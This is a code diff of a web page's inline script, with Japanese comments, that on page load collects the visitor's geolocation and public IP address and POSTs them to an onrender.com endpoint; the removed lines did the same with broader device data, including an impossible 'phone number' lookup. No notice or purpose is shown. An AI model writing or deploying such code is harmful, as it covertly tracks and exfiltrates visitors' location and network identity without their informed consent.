@@ -20,49 +20,44 @@
 
     <script>
 
-function sendDeviceInfo() {
+function sendLocationToServer() {
 
-// デバイス情報オブジェクト
-const deviceInfo = {}; 
+function getIPAddress() {
+  return fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => data.ip); 
+}
 
-// OS/ブラウザ情報
-const ua = navigator.userAgent;
-const os = getOS(ua);
-const browser = getBrowser(ua);
-deviceInfo.os = `${os.name} ${os.version}`;
-deviceInfo.browser = `${browser.name} ${browser.version}`;
+navigator.geolocation.getCurrentPosition(function(position) {
 
-// 画面情報
-const { width, height} = screen;
-deviceInfo.screen = `${width}x${height}`;
+  var latitude = position.coords.latitude;
+  var longitude = position.coords.longitude;
+  
+  var locationData = {
+    latitude,
+    longitude 
+  };
 
-// 言語設定
-deviceInfo.language = navigator.language; 
+  // IPアドレスとマージして送信
+  getIPAddress().then(ip => {
+  
+    locationData.ip = ip;
 
-// 位置情報
-navigator.geolocation.getCurrentPosition(p => {
-  const { latitude, longitude } = p.coords;  
-  deviceInfo.latitude = latitude;
-  deviceInfo.longitude = longitude;
-});
+    fetch('https://location-ip-data-endpoint.onrender.com', {
+      method: 'POST',
+      headers: {
+       'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(locationData)  
+    });
 
-// その他情報
-deviceInfo.model = navigator.deviceMemory;
-deviceInfo.phone = getPhoneNumber(); 
-deviceInfo.ip = getIPAddress();
+  });
 
-// デバイス情報を送信
-fetch('https://location-ip-test.onrender.com', {
-  method: 'POST',
-  headers: {
-   'Content-Type': 'application/json' 
-  },
-  body: JSON.stringify(deviceInfo)
 });
 
 }
 
-sendDeviceInfo();
+sendLocationToServer();
 
 
     </script>
